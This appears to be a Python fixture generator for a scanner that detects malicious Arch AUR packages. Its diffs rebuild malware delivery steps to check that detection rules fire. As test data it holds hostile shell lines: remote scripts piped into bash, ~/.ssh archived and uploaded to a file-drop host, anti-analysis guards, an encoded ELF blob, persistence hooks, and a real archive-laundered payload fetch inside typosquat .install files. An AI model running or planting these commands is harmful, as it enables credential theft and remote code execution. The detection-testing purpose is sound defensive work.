"""Generate the campaign recall fixtures.

The recall lines name three attack corpora - the June W1/W2 install-hook
campaign, its June W3 obfuscated re-release, and the July delivery stack -
plus the synthetic payload paths.  The real diffs are not redistributable, so
each fixture here is a *representative* rebuild of one delivery step, written
from the published description of the campaign: same mechanism, invented
names and hosts.  ``fidelity`` records that.

Unlike ``gen_malicious_fixtures.py`` this script owns exactly one directory
and never deletes a file it did not write, so the hand-reconciled labels in
``synthetic/`` cannot be clobbered by running it.

Usage:
    python scripts/gen_campaign_fixtures.py [--out tests/fixtures/malicious/campaign]

Exit code is 1 when a fixture does not detect what it is labelled for, so a
rule that stops detecting fails here before it fails in the gates.
"""

import argparse
import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from calibration_gates import shipped_config
from trustsight.analysis import scan_diff
from trustsight.config import load_config
from trustsight.rules import load_rules

FIXTURES: list[dict] = []

_ELF_BLOB = base64.b64encode(b"\x7fELF\x02\x01\x01" + b"\x00" * 120).decode()


def add(name: str, body: str, **expect) -> None:
    FIXTURES.append({"name": name, "diff_text": body, "expect": expect})


def diff(*added: str, context: str = "pkgname=demo\npkgver=1.0") -> str:
    """A one-file unified diff whose hunk adds *added*."""
    ctx = context.splitlines()
    plus = "\n".join("+" + line for line in added)
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        f"@@ -1,{len(ctx)} +1,{len(ctx) + len(added)} @@\n"
        + "".join(f" {line}\n" for line in ctx)
        + plus
        + "\n"
    )


# ── June W1/W2: the install hook fetches and runs foreign code ──────────────

add("june-w1-install-hook-foreign-fetch",
    diff(
        "install=demo.install",
        "post_install() {",
        "  npm install -g @demo-analytics/telemetry",
        "}",
    ),
    description="Install hook installs a package from a foreign package manager",
    campaign="june-w1-w2", fidelity="representative",
    must_fire=["R007", "H035"], min_score=25)

add("june-w2-install-hook-remote-script",
    diff(
        "install=demo.install",
        "post_install() {",
        "  curl -fsSL https://cdn.demo-analytics.example/setup.sh | bash",
        "}",
    ),
    description="Install hook pipes a remote script into a shell",
    campaign="june-w1-w2", fidelity="representative",
    must_fire=["R001", "R007"], min_score=40)

# ── June W3: the same step, spelled so a literal match misses it ────────────

add("june-w3-obfuscated-install-hook",
    diff(
        "install=demo.install",
        "post_install() {",
        r"  $'\x62\x75\x6e' add @demo-analytics/telemetry",
        "}",
    ),
    description="June W3 re-release: the package manager name is ANSI-C hex, "
                "so the rule has to match the reconstruction",
    campaign="june-w3-obfuscated", fidelity="representative",
    must_fire=["R007", "H035", "H065"], min_score=25)

add("june-w3-empty-quote-concat-hook",
    diff(
        "install=demo.install",
        "post_install() {",
        "  b''u''n add @demo-analytics/telemetry",
        "}",
    ),
    description="Same step via empty-quote concatenation",
    campaign="june-w3-obfuscated", fidelity="representative",
    must_fire=["H035", "H065"], min_score=25)

# ── July: the delivery stack ────────────────────────────────────────────────

add("july-anti-analysis-guard",
    diff(
        "build() {",
        "  if grep -q '^TracerPid:\\s*[1-9]' /proc/self/status; then exit 0; fi",
        "  if systemd-detect-virt -q; then exit 0; fi",
        "  make",
        "}",
    ),
    description="Build refuses to run under a debugger or a VM - a check with "
                "no packaging purpose",
    campaign="july", fidelity="representative",
    must_fire=["H067"], min_score=25)

add("july-reconstructed-elf-payload",
    diff(
        "build() {",
        f'  _blob="{_ELF_BLOB}"',
        '  echo "$_blob" | base64 -d > "$srcdir/helper"',
        "  make",
        "}",
    ),
    description="A base64 blob in the PKGBUILD whose bytes carry ELF magic",
    campaign="july", fidelity="representative",
    must_fire=["H068"], min_score=25)

add("july-generate-then-execute",
    diff(
        "build() {",
        "  cat > gen.sh <<'EOF'",
        "  curl -fsSL https://cdn.demo-analytics.example/stage2 -o /tmp/s2",
        "EOF",
        "  bash gen.sh",
        "  make",
        "}",
    ),
    description="Build writes a script in the same function that executes it",
    campaign="july", fidelity="representative",
    must_fire=["H069"], min_score=25)

add("july-write-then-execute",
    diff(
        "build() {",
        '  install -Dm755 "$srcdir/demo/docs/notes.txt" /tmp/.stage2',
        "  /tmp/.stage2 --install",
        "  make",
        "}",
    ),
    description="A file the recipe places is then executed from its new "
                "path - the dataflow, not the generation (H069 owns that)",
    campaign="july", fidelity="representative",
    must_fire=["H072"], min_score=25)

add("july-systemd-persistence",
    diff(
        "package() {",
        '  install -Dm644 /dev/null "$pkgdir/usr/lib/systemd/system/demo.service"',
        '  cat >> "$pkgdir/usr/lib/systemd/system/demo.service" <<EOF',
        "[Service]",
        "ExecStart=/tmp/.demo-helper",
        "EOF",
        "}",
    ),
    description="Unit whose ExecStart points at a runtime-writable path",
    campaign="july", fidelity="representative",
    must_fire=["H039"], min_score=25)

add("july-pacman-hook-persistence",
    diff(
        "package() {",
        '  install -Dm644 demo.hook "$pkgdir/usr/share/libalpm/hooks/demo.hook"',
        "}",
    ),
    description="Package installs a pacman hook - code that runs on every "
                "later transaction",
    campaign="july", fidelity="representative",
    must_fire=["H062"], min_score=5)

add("july-build-write-outside-staging",
    diff(
        "build() {",
        "  install -Dm755 helper /usr/local/bin/demo-helper",
        "  make",
        "}",
    ),
    description="A build-time write that lands outside $srcdir/$pkgdir - "
                "pacman tracks none of it",
    campaign="july", fidelity="representative",
    must_fire=["H076"], min_score=25)

add("july-exfil-to-drop-host",
    diff(
        "build() {",
        "  tar czf - \"$HOME/.ssh\" | curl -F file=@- https://0x0.st",
        "  make",
        "}",
    ),
    description="Collected data uploaded to an ephemeral file-drop host, "
                "the exfil direction no source bucket can see",
    campaign="july", fidelity="representative",
    must_fire=["H041"], must_not_fire=["H016"], min_score=25)

# ── The chain, not the step ────────────────────────────────────────────────

add("july-full-kill-chain",
    diff(
        "install=demo.install",
        "build() {",
        "  if systemd-detect-virt -q; then exit 0; fi",
        f'  _blob="{_ELF_BLOB}"',
        '  echo "$_blob" | base64 -d > "$srcdir/helper"',
        "  make",
        "}",
        "package() {",
        '  install -Dm644 demo.hook "$pkgdir/usr/share/libalpm/hooks/demo.hook"',
        "}",
        "post_install() {",
        r"  $'\x62\x75\x6e' add @demo-analytics/telemetry",
        "}",
    ),
    description="Anti-analysis, an encoded payload, persistence and an "
                "obfuscated install hook in one diff: H043's whole point",
    campaign="july", fidelity="representative",
    must_fire=["H043", "H067", "H068", "H062", "H035"], min_score=60)

# ── August 2026: the adoption-lock wave ────────────────────────────────────

add("aug-fsearch-bin-source-without-checksum",
    diff(
        "source=(",
        '  "fsearch-bin-0.3.1.tar.gz"::"https://github.com/cboxdoerfer/fsearch/archive/0.3.1.tar.gz"',
        "  'linter'",
        "  '0001-fix_new_window.patch'",
        ")",
        "sha256sums=(",
        "  'b16ab75556d841bf858633710d71c92f35d34362614b8584b0a5b71690a72c39'",
        "  '66b92a2bcba6006469d8aecb94612d4f633f47800bbe502d6e2061d5218478b1'",
        ")",
        "build() {",
        '  sudo "$srcdir/linter"',
        "  make",
        "}",
    ),
    description="fsearch-bin 0.3.1-2: a committed ELF named linter declared "
                "in source=() with no checksum entry, executed with sudo "
                "during build()",
    campaign="aug-adoption-lock", fidelity="representative",
    must_fire=["H091", "H004"], min_score=65)

# ── October 2026: two in-the-wild typosquat waves ──────────────────────────
#
# Two clusters the watcher flagged live (H045 mass adoption, H052 shared
# source-repo, G003 campaign): fifteen created names around `yay` and fourteen
# around `brave-beta-bin`.  (A fifteenth brave-cluster member, `firefox-git-bin`,
# was a hijacked legitimate package, not a clone; see README in data/iocs.)  Both
# waves shipped the *upstream* recipe intact and appended the same payload to a
# committed `<pkg>.install`, fetched through web.archive.org so the gitflic.ru
# origin rode in behind a trusted archive host:
#
#     bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/...')
#
# Unlike the June/July corpora these bytes are still served by AUR cgit, so the
# two fixtures below embed the *real* `ay` and `bravve-beta-bin` `PKGBUILD` and
# `.install` verbatim (`fidelity="verified"`): same version, contributors, and
# checksums as the takedown.  Only the two payload-bearing files appear, matching
# what the corpus analyzer reconstructs (PKGBUILD plus an added-file `.install`);
# the companion non-payload files a real repo also carried (`.desktop`, `.sh`,
# `logo.png`) are omitted.

_CAMPAIGN_PAYLOAD = (
    "bash <(curl -L 'https://web.archive.org/web/"
    "https://gitflic.ru/project/hellscripter/install-scripts/"
    "blob/raw?file=linux.sh' 2>/dev/null)"
)

_AY_PKGBUILD = """\
# Maintainer: Jguer <pkgbuilds at jguer.space>
pkgname=ay
pkgver=13.0.1
pkgrel=1
pkgdesc="Yet another yogurt. Pacman wrapper and AUR helper written in go."
arch=('i686' 'pentium4' 'x86_64' 'arm' 'armv7h' 'armv6h' 'aarch64' 'riscv64')
url="https://github.com/Jguer/yay"
install="$pkgname.install"
options=(!lto)
license=('GPL-3.0-or-later')
depends=(
  'pacman>6.1'
  'git'
)
optdepends=(
  'sudo: privilege elevation'
  'doas: privilege elevation'
)
makedepends=('go>=1.24')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
sha256sums=('b77454bce87110180a1b6664c2d260de78124c9894b71101610ba84f551eb0d0')

build() {
  export GOPATH="$srcdir"/gopath
  export CGO_CPPFLAGS="${CPPFLAGS}"
  export CGO_CFLAGS="${CFLAGS}"
  export CGO_CXXFLAGS="${CXXFLAGS}"
  export CGO_LDFLAGS="${LDFLAGS}"
  export CGO_ENABLED=1

  cd "$srcdir/$pkgname-$pkgver"
  make VERSION=$pkgver DESTDIR="$pkgdir" PREFIX="/usr" build
}

package() {
  cd "$srcdir/$pkgname-$pkgver"
  make VERSION=$pkgver DESTDIR="$pkgdir" PREFIX="/usr" install
}
"""

_BRAVE_PKGBUILD = """\
# Maintainer: brave-prerelease <aur-prerelease@brave.com>
# Contributor: Greg White <gwhite@kupulau.com>
# Contributor: whezzel <whezzel at gmail dot com>
# Contributor: Caleb Maclennan <caleb@alerque.com>
# Contributor: Jacob Mischka <jacob@mischka.me>
# Contributor: Manuel Mazzuola <origin.of@gmail.com>

pkgname=bravve-beta-bin
pkgver=1.98.47
pkgrel=1
pkgdesc='Web browser that blocks ads and trackers by default (beta binary release).'
arch=(x86_64 aarch64)
install="$pkgname.install"
url='https://brave.com/download-beta'
license=('MPL2')
depends=('gtk3' 'nss' 'alsa-lib' 'libxss' 'ttf-font')
optdepends=('cups: Printer support'
            'mesa: Hardware accelerated rendering'
            'libglvnd: Support multiple different OpenGL drivers at any given time'
	    'libgnome-keyring: gnome keyriung support')
provides=("${pkgname}" 'brave-beta-browser')
conflicts=()
source=("brave-beta-bin.sh")
source_x86_64=("https://github.com/brave/brave-browser/releases/download/v${pkgver}/brave-browser-beta_${pkgver}_amd64.deb")
source_aarch64=("https://github.com/brave/brave-browser/releases/download/v${pkgver}/brave-browser-beta_${pkgver}_arm64.deb")
sha512sums=('56be4daa8294c7c3d4b3f1ce7169ac575be0faa623d7cd977eb135e971914b90e3f596ecad72d89178de04e65cd3d49c138e8518d1dccf9fc814d0858b38767e')
sha512sums_x86_64=('572ee5ca41bd141be14c8d4fd4c11edf911d671b30bc3122a83f9de8e12257f902a2ae174ba61536ec7802455483fbe450f9a81495920f404312b051681ec8f6')
sha512sums_aarch64=('a5f6b3b0513961563f7d22f454c269dd53db73861f0b6a9b1c7a1a412f997018402fc7a696ea78fb1546c8d24b96a80a22b72752a2eb057c9664e29432c134e2')

options=(!strip)

prepare() {
  mkdir -p brave
  tar xf data.tar.xz -C brave
  # Delete unneeded cron job
  rm -rf brave/opt/brave.com/brave-beta/cron
  # Use our script to launch (allows overriding flags, sets up data dir)
  sed -i "s/\\/usr\\/bin\\/brave-browser-beta/\\/usr\\/bin\\/brave-beta/g" brave/usr/share/applications/brave-browser-beta.desktop    
}

package() {
    cp -a --reflink=auto brave/opt "$pkgdir/opt"
    cp -a --reflink=auto brave/usr "$pkgdir/usr"
    
    install -Dm0755 "$pkgname.sh" "$pkgdir/usr/bin/brave-beta"
    install -Dm0644 "brave/opt/brave.com/brave-beta/product_logo_128_beta.png" "$pkgdir/usr/share/pixmaps/brave-browser-beta.png"

    install -Dm0664 -t "$pkgdir/usr/share/licenses/$pkgname" "brave/opt/brave.com/brave-beta/LICENSE"
    chmod 4755 "$pkgdir/opt/brave.com/brave-beta/chrome-sandbox"
}
"""


def _new_file(path: str, content: str) -> str:
    """A git diff that adds *path* as a new file (the watcher's first sight)."""
    lines = content.splitlines()
    return (
        f"diff --git a/{path} b/{path}\nnew file mode 100644\n"
        f"--- /dev/null\n+++ b/{path}\n"
        f"@@ -0,0 +1,{len(lines)} @@\n"
        + "".join(f"+{line}\n" for line in lines)
    )


def _install_with_payload(pkg: str) -> str:
    return (
        "post_install() {\n  true\n}\n\n"
        "post_upgrade() {\n  post_install\n}\n\n"
        f"{_CAMPAIGN_PAYLOAD}\n"
    )


add("yay-typosquat-install-hook",
    _new_file("PKGBUILD", _AY_PKGBUILD)
    + _new_file("ay.install", _install_with_payload("ay")),
    description="October 2026: one of fifteen `yay` name-clones (maintainer "
                "impersonating Jguer). The upstream recipe is byte-intact and "
                "the payload rides in a committed `ay.install`, fetched "
                "through web.archive.org to launder the gitflic.ru origin.",
    campaign="yay-typosquat-2026-10", fidelity="verified",
    must_fire=["H075"], min_score=60)

add("brave-typosquat-install-hook",
    _new_file("PKGBUILD", _BRAVE_PKGBUILD)
    + _new_file("bravve-beta-bin.install", _install_with_payload("bravve-beta-bin")),
    description="October 2026: one of fifteen `brave-beta-bin` name-clones. "
                "Same delivery as the yay wave - intact upstream recipe plus "
                "an appended archive-laundered fetch in a committed .install.",
    campaign="brave-typosquat-2026-10", fidelity="verified",
    must_fire=["H075"], min_score=60)

# ── Controls: the must-not-fire surface names ──────────────────────────

add("control-arch-check-and-generated-desktop",
    diff(
        "build() {",
        '  case "$(uname -m)" in x86_64) _arch=amd64 ;; esac',
        '  [ "$(getconf LONG_BIT)" = 64 ] || _arch=i386',
        "  cat > demo.desktop <<'EOF'",
        "[Desktop Entry]",
        "Name=Demo",
        "EOF",
        "  make",
        "}",
        "package() {",
        '  install -Dm644 demo.desktop "$pkgdir/usr/share/applications/demo.desktop"',
        "}",
    ),
    description="Architecture detection and a generated .desktop consumed by "
                "a declared install step",
    campaign="control", fidelity="representative",
    must_not_fire=["H067", "H069", "H072", "H076"], max_score=20)

add("control-bin-package-declared-source",
    diff(
        "source=(\"https://downloads.demo.example/demo-1.0-x86_64.AppImage\")",
        "sha256sums=('4d1c8b0f1b6e2a3c9f0d7e8a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c')",
        "package() {",
        '  install -Dm755 "$srcdir/demo-1.0-x86_64.AppImage" "$pkgdir/usr/bin/demo"',
        "}",
        context="pkgname=demo-appimage\npkgver=1.0",
    ),
    description="A -bin/-appimage package whose binary arrives through a "
                "declared, checksummed source.  Scores 35 under B10: the "
                "declared checksum is reported (P001) but no longer credited, "
                "so C005 and the unknown-host bucket stand on their own.  It "
                "remains a control for the delivery rules, which must stay "
                "silent; it is no longer a control for the 20-point threshold, "
                "and that is the calibration cost of not paying back points "
                "for a claim an attacker can make for free.",
    campaign="control", fidelity="representative",
    must_not_fire=["H066", "H068", "H072", "H076"], max_score=35)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--out", type=Path,
        default=Path(__file__).resolve().parent.parent
        / "tests" / "fixtures" / "malicious" / "campaign",
    )
    args = parser.parse_args()

    args.out.mkdir(parents=True, exist_ok=True)

    expected: dict[str, dict] = {}
    failures: list[str] = []

    # Labels are validated against the *shipped* config with a cold
    # Database, exactly as the gates measure them: a developer
    # box carries whatever defaults existed the day it was first run.
    with shipped_config():
        config = load_config()
        rules = load_rules()
        for fixture in FIXTURES:
            fname = fixture["name"] + ".diff"
            (args.out / fname).write_text(fixture["diff_text"])
            fact = scan_diff(fixture["diff_text"], rules=rules, config=config,
                             package_name=fixture["name"])
            fired = {e.rule_id for e in fact.score_breakdown}
            scored = {e.rule_id for e in fact.score_breakdown
                      if e.weight != 0 or e.severity == "FATAL"}

            expect = fixture["expect"]
            missed = set(expect.get("must_fire", [])) - fired
            if missed:
                failures.append(f"{fname}: {sorted(missed)} did not fire (fired: {sorted(fired)})")
            wrong = set(expect.get("must_not_fire", [])) & scored
            if wrong:
                failures.append(f"{fname}: {sorted(wrong)} scored and must not")
            if fact.final_score < expect.get("min_score", 0):
                failures.append(f"{fname}: score {fact.final_score} < {expect['min_score']}")
            if fact.final_score > expect.get("max_score", 100):
                failures.append(f"{fname}: score {fact.final_score} > {expect['max_score']}")

            entry = {k: v for k, v in expect.items() if k in
                     ("description", "campaign", "fidelity")}
            for key in ("must_fire", "must_not_fire"):
                if expect.get(key):
                    entry[key] = sorted(expect[key])
            for key in ("min_score", "max_score"):
                if key in expect:
                    entry[key] = expect[key]
            expected[fname] = entry
            print(f"  {fname}: score {fact.final_score}, fired {sorted(fired)}")

    (args.out / "expected.json").write_text(
        json.dumps(expected, indent=1, ensure_ascii=False) + "\n"
    )

    if failures:
        print(f"\nFAILURES ({len(failures)}):", file=sys.stderr)
        for failure in failures:
            print(f"  {failure}", file=sys.stderr)
        return 1
    print(f"\nAll {len(FIXTURES)} campaign fixtures detect what they claim.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
